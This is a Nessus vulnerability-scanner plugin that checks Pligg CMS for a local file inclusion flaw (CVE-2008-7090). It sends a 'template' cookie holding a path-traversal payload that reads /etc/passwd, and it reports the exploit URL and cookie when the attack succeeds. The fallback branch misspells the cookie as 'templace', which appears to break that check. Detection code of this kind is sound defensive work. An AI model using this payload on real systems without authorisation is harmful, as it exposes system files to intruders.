#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(33848);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2008-7090");
  script_bugtraq_id(30458);
  script_xref(name:"milw0rm", value:"6173");
  script_xref(name:"OSVDB", value:"50188");
 
  script_name(english:"Pligg settemplate.php template Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file via settemplate.php in Pligg");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Pligg, an open-source content management
system. 

The installed version of Pligg fails to sanitize the 'template' cookie
before using it in 'config.php' to include PHP code.  An
unauthenticated remote attacker can exploit this issue to view
arbitrary files or even execute arbitrary PHP code, subject to the
privileges of the web server user id. 

In addition, there are reportedly a number of other issues associated
with this one including cross-site scripting, SQL injection and file
enumeration.  Nessus has not checked for them, though." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00120-07312008" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/494987" );
 script_set_attribute(attribute:"see_also", value:"http://forums.pligg.com/current-version/14301-pligg-beta-9-9-5-a.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Pligg 9.9.5 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq("/pligg", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  exploit = "../../../../../../../../../../../../etc/passwd%00";	
  url = string(dir,"/settemplate.php");
  set_http_cookie(name: "template", value: exploit);
  r  = http_send_recv3(method: "GET", item:url, port:port);   
  if (isnull(r)) exit(0);
  
  if (egrep(pattern:"root:.*:0:[01]:", string:r[2]))
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to retrieve the contents of '/etc/passwd' using the\n",
        "following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n",
        "and setting the following cookie :\n",
        "\n",
        "  Cookie: template=", exploit, "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "This produced the following output :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string: r[0]+r[1]+'\n'+r[2]), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
  else 
  {
    # If magic_quotes_gpc is turned on, the previous exploit won't work. 
    exploit = "../templates/yget";
    set_http_cookie(name: "templace", value: exploit);
    r  = http_send_recv3(method: "GET", item:url, port:port);
    if (isnull(r)) exit(0);
   
    if (
      "Pligg Content Management System" >< r[2] && 
      "templates/../templates/yget/images/expand.png" >< r[2]
    )
    {
      security_warning(port);
      exit(0);
    }		
  }
}
